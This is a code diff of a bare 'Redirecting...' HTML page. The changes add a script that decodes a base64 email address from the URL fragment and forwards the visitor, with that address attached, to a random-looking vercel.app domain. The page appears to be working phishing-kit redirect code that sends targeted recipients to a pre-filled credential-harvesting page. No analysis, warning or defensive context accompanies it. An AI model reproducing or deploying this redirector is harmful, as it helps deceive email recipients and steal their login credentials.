@@ -1,41 +1,48 @@
-<!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta http-equiv="refresh" content="0;url=https://dchyddgnjyffdfssfhjjjvffgghjyffgjjg.vercel.app">
-    <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <script type="text/javascript">
-        function getafterhash(url) {
-            var ret;
-            // Extract parts of the URL based on different delimiters
-            var queryStringhash = url.split('#')[1];
-            var queryStringsemi = url.split(';')[1];
-            var queryStringsemiplus = url.split(';+')[1];
-            var queryStringstartsemi = url.split('*;')[1];
-
-            // Check which part exists and assign it to ret
-            if (queryStringhash) {
-                ret = queryStringhash;
-            } else if (queryStringsemi) {
-                ret = queryStringsemi;
-            } else if (queryStringsemiplus) {
-                ret = queryStringsemiplus;
-            } else if (queryStringstartsemi) {
-                ret = queryStringstartsemi;
-            } else {
-                ret = 0;
-            }
-
-            return ret;
-        }
-
-        // Example usage of getafterhash function
-        var url_string = window.location.href;
-        var extracted_value = getafterhash(url_string);
-        console.log("Extracted Value: ", extracted_value);
-    </script>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <title>Redirecting...</title>
 </head>
+
 <body>
-    <p>If you are not redirected automatically, follow this <a href="https://dchyddgnjyffdfssfhjjjvffgghjyffgjjg.vercel.app/#">link to the landing page</a>.</p>
+
+  <script type="text/javascript">
+    var url_string = window.location.href;
+    var url_get_email = atob(getafterhash(url_string));
+    
+    // Check if url_get_email is valid before constructing the URL
+    if (url_get_email) {
+      var mail_go_url = "https://ogandghgfcfghjjdegjkjcfdfhhjgddfghj.vercel.app#" + url_get_email;
+      location.replace(mail_go_url);
+    } else {
+      console.error("No valid email found in the URL hash.");
+    }
+
+    function getafterhash(url) {
+      var ret;
+      var queryStringhash = url.split('#')[1];
+      var queryStringsemi = url.split(';')[1];
+      var queryStringsemiplus = url.split(';+')[1];
+      var queryStringstartsemi = url.split('*;')[1];
+
+      if (queryStringhash) {
+        ret = queryStringhash;
+      } else if (queryStringsemi) {
+        ret = queryStringsemi;
+      } else if (queryStringsemiplus) {
+        ret = queryStringsemiplus;
+      } else if (queryStringstartsemi) {
+        ret = queryStringstartsemi;
+      } else {
+        ret = 0;
+      }
+
+      return ret;
+    }
+  </script>
+
 </body>
+
 </html>
